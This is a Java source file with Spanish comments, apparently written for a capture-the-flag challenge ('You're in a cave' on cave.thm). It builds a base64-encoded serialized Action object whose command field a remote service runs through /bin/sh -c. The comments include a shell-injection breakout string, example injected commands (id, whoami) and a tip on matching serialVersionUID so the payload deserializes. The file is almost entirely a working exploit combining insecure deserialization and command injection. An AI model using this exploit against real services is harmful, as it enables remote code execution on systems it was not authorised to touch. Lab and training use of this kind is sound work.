// Forja un objeto Action serializado (base64) para el reto "You're in a cave".
// El servicio TCP (3333) deserializa la respuesta de http://cave.thm/<input> como Action
// y ejecuta el campo 'command' via /bin/sh -c. Hay que romper el echo envolvente con:  x";<CMD>;echo "
//
// Uso:
//   javac Action.java Serialize.java Make.java
//   java Make 'x";id;whoami;echo "'
//
// CRITICO: el serialVersionUID debe ser el MISMO que el del server (aqui el del reto).
// Si compilas con JDK>8 para un server JDK8, el UID autogenerado cambia y la
// deserializacion falla; por eso se fija explicitamente.
import java.io.*;
import java.util.Base64;

public class Action implements Serializable {
    private static final long serialVersionUID = -451400175896815301L; // 0xf9bc4dee801f193b (server)
    public final String name;
    public final String command;
    public String output = "";
    public Action(String name, String command) { this.name = name; this.command = command; }
}

class Serialize {
    public static String toString(Serializable o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
}

class Make {
    public static void main(String[] a) throws Exception {
        // payload tipico: x";COMANDO;echo "
        System.out.println(Serialize.toString(new Action("pwn", a[0])));
    }
}
